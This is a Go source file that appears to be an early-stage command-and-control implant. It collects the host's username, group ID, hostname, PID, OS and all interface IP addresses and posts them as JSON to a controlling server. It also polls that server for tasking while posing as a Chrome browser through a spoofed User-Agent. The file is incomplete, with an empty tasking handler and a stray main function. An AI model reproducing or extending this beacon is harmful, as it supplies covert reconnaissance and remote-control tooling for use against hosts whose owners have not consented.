package node

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"messages"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"

	uuid "github.com/satori/go.uuid"
)

type node struct {
	ID           uuid.UUID
	Platform     string
	Architecture string
	UserName     string
	UserGUID     string
	HostName     string
	Ips          []string
	Pid          int
	Log          *os.File
	UserAgent    string
	FirstTime    time.Time
	MostRecent   time.Time
	FailureCount int
	initial      bool
}

func main() {
	fmt.Println("here")
}

func New() node {
	u, err := uuid.NewV4()
	if err != nil {
		log.Panic(err)
	}
	n := node{
		ID:           u,
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
		initial:      false,
	}

	user, err := user.Current()
	if err != nil {
		log.Println(err)
	} else {
		n.UserName = user.Username
		n.UserGUID = user.Gid
	}

	h, err := os.Hostname()
	if err != nil {
		log.Println(err)
	} else {
		n.HostName = h
	}

	interfaces, err := net.Interfaces()
	if err != nil {
		log.Println(err)
	} else {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					n.Ips = append(n.Ips, addr.String())
				}
			}
		}
	}
	return n
}

func (n *node) Run(server string) {
	rand.Seed(time.Now().UTC().UnixNano())

	// for {
	if n.initial {
		go n.firstRun(server, &http.Client{})
	} else {
		n.initial = n.firstRun(server, &http.Client{})
	}
	// }
}

func (n *node) firstRun(host string, client *http.Client) bool {
	s := messages.SysInfo{
		Platform:     n.Platform,
		Architecture: n.Architecture,
		UserName:     n.UserName,
		UserGUID:     n.UserGUID,
		HostName:     n.HostName,
		Pid:          n.Pid,
		Ips:          n.Ips,
	}
	sysInfoPayload, err := json.Marshal(s)
	if err != nil {
		log.Println(err)
	}

	msg := messages.Base{
		ID:      n.ID,
		Type:    "first",
		Payload: (*json.RawMessage)(&sysInfoPayload),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(msg)

	req, err := http.NewRequest("POST", host, b)
	if err != nil {
		log.Panicln(err)
	}
	req.Header.Set("User-Agent", n.UserAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := client.Do(req)

	if err != nil {
		n.FailureCount++
		return false
	}

	if resp.StatusCode != 200 {
		n.FailureCount++
		return false
	}
	n.FailureCount = 0
	return true
}

func (n *node) checkIn(host string, client *http.Client) {
	msg := messages.Base{
		ID:   n.ID,
		Type: "status",
	}
	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(msg)

	req, err := http.NewRequest("POST", host, b)

	if err != nil {
		log.Println(err)
	}
	req.Header.Set("User-Agent", n.UserAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := client.Do(req)

	if err != nil {
		n.FailureCount++
		log.Println(err)
		return
	}
	if resp.StatusCode != 200 {
		n.FailureCount++
		return
	}

	n.FailureCount = 0
	if resp.ContentLength != 0 {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}

		json.NewDecoder(resp.Body).Decode(&j)

		continueCheckIn(j)
	}
}

func continueCheckIn(j messages.Base) {
	switch j.Type {
	case "temp":

	}
}
